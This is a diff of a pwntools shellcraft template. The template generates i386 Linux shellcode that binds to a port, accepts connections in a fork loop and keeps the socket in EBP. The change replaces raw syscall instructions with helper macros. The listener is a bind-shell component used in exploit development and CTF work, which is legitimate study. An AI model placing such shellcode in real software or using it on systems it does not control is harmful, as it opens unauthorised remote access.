@@ -1,4 +1,6 @@
 <% from pwnlib.shellcraft import common %>
+<% from pwnlib.constants.linux import i386 as constants %>
+<% from pwnlib.util.packing import make_packer %>
 <% from socket import htons %>
 <%page args="port"/>
 <%docstring>
@@ -6,8 +8,11 @@
     Waits for a connection.  Leaves socket in EBP.
     ipv4 only
 </%docstring>
-<% acceptloop = common.label("acceptloop")
-looplabel = common.label("loop")
+<%
+  acceptloop = common.label("acceptloop")
+  looplabel = common.label("loop")
+  p16  = make_packer(16, 'little', 'unsigned')
+  p16b = make_packer(16, 'big', 'unsigned')
 %>
 
 ${acceptloop}:
@@ -15,21 +20,17 @@ ${acceptloop}:
         /*  Socket file descriptor is placed in EBP */
 
         /*  sock = socket(AF_INET, SOCK_STREAM, 0) */
-        push SYS_socketcall
-        pop eax
-        push SYS_socketcall_socket
-        pop ebx
+        ${i386.mov('eax', constants.SYS_socketcall)}
+        ${i386.mov('ebx', constants.SYS_socketcall_socket)}
         cdq                     /*  clear EDX */
         push edx                /*  IPPROTO_IP (= 0) */
         push ebx                /*  SOCK_STREAM */
         push AF_INET
-        mov ecx, esp
-        int 0x80
+        ${i386.linux.syscall('eax', 'ebx', 'esp')}
 
         /*  bind(sock, &addr, sizeof addr); // sizeof addr == 0x10 */
         push edx
-        pushw ${htons(int(port))}
-        pushw AF_INET
+        ${i386.pushstr(p16(constants.AF_INET) + p16b(int(port)))}
         mov ecx, esp
         push 0x10
         push ecx
@@ -66,9 +67,7 @@ ${looplabel}:
         cmovz ebx, esi /*  on child we close the server sock instead */
 
         /*  close(sock) */
-        push byte SYS_close
-        pop eax
-        int 0x80
+        ${i386.linux.syscall('SYS_close', 'ebx')}
 
         test edi, edi
         jnz ${looplabel}
